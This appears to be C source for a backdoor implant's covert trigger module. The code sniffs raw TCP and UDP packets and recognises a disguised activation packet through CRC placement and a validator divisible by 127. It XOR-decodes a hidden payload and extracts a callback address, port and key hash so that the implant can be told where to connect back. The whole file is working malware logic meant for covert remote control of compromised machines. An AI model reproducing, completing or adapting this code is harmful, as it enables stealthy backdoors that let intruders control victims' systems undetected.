#include <string.h>
#include <time.h>

#include "function_strings.h"
#include "compat.h"
#include "tiny_crc16.h"
#include "trigger_payload.h"
#include "trigger_listen.h"
#include "trigger_b64.h"
#include "debug.h"


/*!
 * \brief Check for triggers, entry/exit point into checking fo pkts
 *
 * @param pkt - packet
 * @param len - packet length
 * @param p - payload
 * @return
 * @retval SUCCESS (0)
 * @retval FAILURE (-1)
 */
int
dt_signature_check (unsigned char *pkt, int len, Payload *p)
{
	struct udphdr_t *udp_pkt = NULL;
	struct iphdr_t *ip_pkt = NULL;
	struct tcphdr_t *tcp_pkt = NULL;
	struct iphdr_t iphdr_temp;	/* In order to access the bit-fields on SPARC, because of memory alignment
	 	 	 	 	 requirements for accessing memory, we cannot just cast the struct iphdr_t
	 	 	 	 	 to the unsigned char *pkt.  Instead, we have to copy the ip header into a
	 	 	 	 	 separately allocated structure to ensure it is properly aligned when we attempt to access it. */

//	D (printf("%s, %4d:\n", __FILE__, __LINE__); )
	if (len < 15 || pkt == NULL) {
		return FAILURE;
	}

	// get the start of the IP portion on the header
	if (pkt[12] == 0x8 && pkt[13] == 0x0) {
		// packet is considered to have a eth hdr if the proto
		// number 8(IP) is present at the correct offset

//              D(printf(" Packet has ethdhr\n");)

		ip_pkt = (struct iphdr_t *) ((char *) pkt + sizeof (struct ethhdr_t));
	}
	else if (pkt[0] == 0x45) {
		// no ethhdr, see if just IP
		// packet is considered IP if its 1st byte id 0x45,
		// this means IPv4 and standard 20 byte length

		DLX(4, printf ("Packet does NOT have ethdhr\n"));
		ip_pkt = (struct iphdr_t *) pkt;
	}
	else {
		/// \todo add search for IP header code here!!! */
		//D (printf("%s, %4d: Packet IP header NOT found. Returning....\n", __FILE__, __LINE__); )
			return FAILURE;
	}

	// At this point, we have a good pointer to the start of the IP header

	memcpy (&iphdr_temp, ip_pkt, sizeof (struct iphdr_t));

	if (ip_pkt->protocol == IPPROTO_UDP) {
		uint16_t pkt_length;

		udp_pkt = (struct udphdr_t *) ((unsigned char *) ip_pkt + iphdr_temp.ihl * 4);		// Points to start of UDP packet
		pkt_length = ntohs(ip_pkt->tot_len) - sizeof(struct iphdr_t) - sizeof(struct udphdr_t); // Payload packet length = total length - headers

		// Check for raw UDP first, otherwise try TFTP and DNS
		if (pkt_length >= MIN_PACKET_SIZE && pkt_length <= MAX_PACKET_SIZE) // Only check packets that are within valid limits
			if (dt_raw_udp (udp_pkt, pkt_length, p) == SUCCESS)
				return SUCCESS;
	}
	else if (ip_pkt->protocol == IPPROTO_TCP) {
		uint16_t pkt_length;

		tcp_pkt = (struct tcphdr_t *) ((unsigned char *) ip_pkt + iphdr_temp.ihl * 4);
		pkt_length = ntohs(iphdr_temp.tot_len) - (iphdr_temp.ihl * 4) - (tcp_pkt->tcphdrleng * 4);

		if (pkt_length >= MIN_PACKET_SIZE && pkt_length <= MAX_PACKET_SIZE) // Only check packets that are within valid limits
			return dt_raw_tcp (tcp_pkt, pkt_length, p);
	}
	else {
		return FAILURE;
	}

	return FAILURE;

}

//******************************************************************
int
deobfuscate_payload (Payload * p)
{
	size_t i;
	uint8_t *package;
	uint16_t crc;

	package = (uint8_t *)p;

	DLX(5,
		printf ("\t deobfuscating payload of %d bytes\n\t               ", (int) sizeof(Payload));
		for (i = 0; i < sizeof(Payload); i++)
			printf(" %2.2i", (int)i );
		printf ("\n\t    obfuscated:");
		for (i = 0; i < sizeof(Payload); i++)
			printf(" %2.2x", package[i]);
	);

	for (i = 1; i < (int) sizeof (Payload); i++) {
		package[i] ^= package[0];		//deobfuscate with XOR of first byte
	}

	DLX(5, printf ("\n\t de-obfuscated:");
		for (i = 0; i < sizeof(Payload); i++)
			printf(" %2.2x", package[i]);
		printf("\n")
	);

	crc = ntohs(p->crc);
	p->crc = 0;
	if ( (tiny_crc16((uint8_t *)p, sizeof(Payload)) == crc) && (crc != 0)) {

		p->crc = crc;		// Put CRC back in payload for debug display.
		return SUCCESS;
	}

	DLX(5, printf ("CRC check failed. Payload CRC = 0x%0x\n", crc));
	return FAILURE;
}

//******************************************************************
int
dt_raw_udp (struct udphdr_t *udp, uint16_t pktlen, Payload *p)
{
	return raw_check ((uint8_t *) udp + sizeof (struct udphdr_t), pktlen, p);
}

//******************************************************************
int
dt_raw_tcp (struct tcphdr_t *tcp, uint16_t pktlen, Payload *p)
{
	return raw_check ((uint8_t *) tcp + (tcp->tcphdrleng * 4), pktlen, p);
}
//******************************************************************
/*!
 * raw_check
 * @param incload	- Raw TCP payload pointer
 * @param pktlen	- Packet length
 * @param p		- Trigger payload pointer
 * @return
 * @retval SUCCESS (0)
 * @retval FAILURE (-1)
 *
 * raw_check accepts a pointer to the raw TCP or UDP payload and returns
 * the trigger payload in the buffer pointed to by p.
 *
 */
int
raw_check (uint8_t *data, uint16_t pktlen, Payload *p)
{
	uint16_t crc = 0;
	uint8_t *fieldPtr;			// Packet field pointer
	uint16_t uint16buf = 0;
	uint16_t netcrc;
	uint16_t validator;
	uint8_t *payloadKeyIndex;
	uint8_t *payloadIndex;
	int i;				// Loop counter
	uint8_t *pp;

	//////////////////////////////////////////////////////////////////////////////////////////////////////
	// NOTE: Memcpy is used in this function to prevent unaligned memory accesses in Sparc architectures.
	//////////////////////////////////////////////////////////////////////////////////////////////////////

	pp = (uint8_t *)p;
	// Compute the checksum of bytes between START_PAD and CRC.
	crc = tiny_crc16 ((unsigned char *) ((char *) data + START_PAD), CRC_DATA_LENGTH);

	// Get the CRC at the offset START_PAD + CRC_DATA_LENGTH + CRC % 200 into the packet.
	fieldPtr = data + START_PAD + CRC_DATA_LENGTH + (crc % 200);	// Set field pointer to the location of the CRC
	if (fieldPtr == 0 || (fieldPtr > (data + pktlen)))		// Make sure it's within bounds
		return FAILURE;

	DL(6);
	memcpy(&uint16buf, fieldPtr, sizeof(uint16_t));
	netcrc = ntohs(uint16buf);
	DLX(6, printf ("CRC is 0x%0x into data, NET CRC = 0x%2.2x\n", (unsigned int)(fieldPtr - data), netcrc));

	if (crc != netcrc) {
		DLX(6, printf ("CRC = 0x%2.2x, CRC check failed\n", crc));
		return FAILURE;			// Check 1 failure: CRCs don't match
	}

	fieldPtr += sizeof(crc);
	memcpy(&uint16buf, fieldPtr, sizeof(uint16_t));
	validator = ntohs(uint16buf);
	DLX(6, printf ("Validator location: 0x%0x, Trigger validator = %d\n", (unsigned int)(fieldPtr - data), validator));
	if ( (validator % 127) != 0) {
		DLX(6, printf ("Validator check failed: validator = 0x%2.2x\n", validator));
		return FAILURE;			// Check 2 failure: integer not divisible by 127
	}

	fieldPtr += sizeof(validator) + PAD1;		// Update field pointer to point to trigger payload.
	payloadIndex = fieldPtr;
	payloadKeyIndex = (uint8_t *)(data + START_PAD + (crc % (CRC_DATA_LENGTH - sizeof(Payload))));	// Compute the start of the payload key
	DLX(6, printf("Encoded Payload offset\t0x%0x, Payload key offset: 0x%0x\tPayload follows:\n", (unsigned int)(fieldPtr - data), (unsigned int)(payloadKeyIndex - (uint8_t *)data)));
	for (i = 0; i < (int)sizeof(Payload); i++) {
		uint8_t trigger;

		trigger = payloadKeyIndex[i] ^ payloadIndex[i];			// XOR the trigger payload with the key
		DLX(6, printf ("\tByte[%2.2d]: encoded payload = 0x%2.2x,  payloadKey= 0x%2.2x, decoded payload = 0x%2.2x\n", i, payloadIndex[i], payloadKeyIndex[i], trigger));
		memcpy((void *)(pp + i), (void *)&trigger, sizeof(uint8_t));
	}
	DLX(6, printf ("\n"));
	return SUCCESS;
}

/*! \brief Move payload into trigger info.
 *
 * @param p payload
 * @param ti trigger
 * @return SUCCESS or FAILURE.
 */
int
payload_to_trigger_info (Payload *p, TriggerInfo *ti)
{
	uint16_t crc;

	if (p == NULL || ti == NULL) {
		return FAILURE;
	}
	crc = ntohs(p->crc);
	p->crc = 0;
	if (tiny_crc16 ((const uint8_t *) p, sizeof (Payload)) != crc ) {
		DLX(4, printf ("\n>>> CRC failed, payload corrupted.\n\n"));
		return FAILURE;
	}

	ti->callback_addr = p->callback_addr;
	ti->callback_port = ntohs(p->callback_port);
	memcpy (ti->idKey_hash, p->idKey_hash, ID_KEY_HASH_SIZE);

	return SUCCESS;
}

#ifdef DEBUG

//define displaySha1Hash function
void displaySha1Hash(char *label, unsigned char *sha1Hash)
{
	int i=0;

	//Display Label
	printf("%s", label);

	//Display 40 hexadecimal number array
	for (i=0; i < ID_KEY_HASH_SIZE; i++)
		printf("%02x",sha1Hash[i]);
	printf( "\n" );
}
#endif
